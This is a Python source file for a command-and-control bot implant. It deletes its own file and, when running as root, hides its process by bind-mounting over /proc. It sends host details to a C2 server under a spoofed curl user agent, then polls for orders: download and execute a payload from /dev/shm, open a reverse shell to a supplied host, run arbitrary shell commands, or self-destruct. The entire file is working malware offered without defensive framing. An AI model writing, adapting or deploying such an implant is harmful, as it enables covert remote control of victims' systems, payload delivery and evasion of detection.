#!/usr/bin/env python3
import json
import os
import random
import sys

import re
import socket
import subprocess
from base64 import b64encode, b64decode
from multiprocessing import Process
from time import sleep

if sys.version_info[0] < 3:
    import urllib2 as request
else:
    from urllib import request


c2 = 'http://localhost:5000/'
path = '/dev/shm/.cache'
loc = 'register'
chloc = 'checkin?k='
root = False


def cloak():
    try:
        os.remove(__file__)
    except OSError:
        pass
    if root:
        os.system("mount -o bind /var/tmp /proc/{}".format(os.getpid()))


def parse_msg(html):
    for line in html.decode().split('\n'):
        if '_csrf_token' in line:
            return re.search('value="(.*)"', line).group(1)


def register():
    while True:
        try:
            r = request.urlopen(request.Request(c2 + loc, data=b64encode(info.encode()),
                                                headers={'User-Agent': 'curl/7.54.0'}))
        except Exception as e:
            print(e)
            print("Failed, trying again in 60 sec...")
            sleep(random.randint(45, 70))
        else:
            return parse_msg(r.read())


def reverse_shell(conf):
    s = socket.socket(conf.get('inet', 2), conf.get('type', 1))
    i = 0
    while i < 5:
        try:
            s.connect((conf['host'], conf['port']))
            break
        except ConnectionRefusedError:
            sleep(10)
            i += 1
    if i < 5:
        while True:
            cmd = s.recv(1024).decode()
            r = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = r.stdout.read() + r.stderr.read()
            s.send(output_bytes)


def handle_msg(msg):
    msg = b64decode(msg).decode()
    if msg:
        try:
            msg = json.loads(msg)
        except:
            pass
        else:
            if msg['cmd'] == 'update':
                print("Updating")
                subprocess.run(['wget', msg['url'], '-O', path])
                os.chmod(path, 0o755)
                os.execl(path, path)
            elif msg['cmd'] == 'reverse':
                print("Reverse shell")
                p = Process(target=reverse_shell, args=(msg,))
                p.start()
                return p
            elif msg['cmd'] == 'exec':
                print("Executing command")
                p = Process(target=command, args=(msg,))
                p.start()
                return p
            elif msg['cmd'] == 'kill':
                cloak()
                raise SystemExit
    print("nothing to do")


def command(conf):
    os.system(conf['exec'])


def check_in():
    try:
        r = request.urlopen(request.Request(c2 + chloc + key, headers={'User-Agent': 'curl/7.54.0'}))
    except Exception as e:
        print(e)
    else:
        handle_msg(parse_msg(r.read()))


def get_info():
    k = subprocess.check_output(['uname', '-a']).decode()
    try:
        i = subprocess.check_output(['ifconfig']).decode()
    except FileNotFoundError:
        try:
            i = subprocess.check_output(['/sbin/ifconfig']).decode()
        except FileNotFoundError:
            i = subprocess.check_output(['ip', 'addr']).decode()
    o = open('/etc/os-release').read()
    u = os.getuid()
    if u == 0:
        global root
        root = True
    return json.dumps(dict(k=k, i=i, o=o, u=u))


if __name__ == '__main__':
    info = get_info()
    cloak()
    key = register()
    print(key)
    while True:
        check_in()
        sleep(random.randint(5, 5))
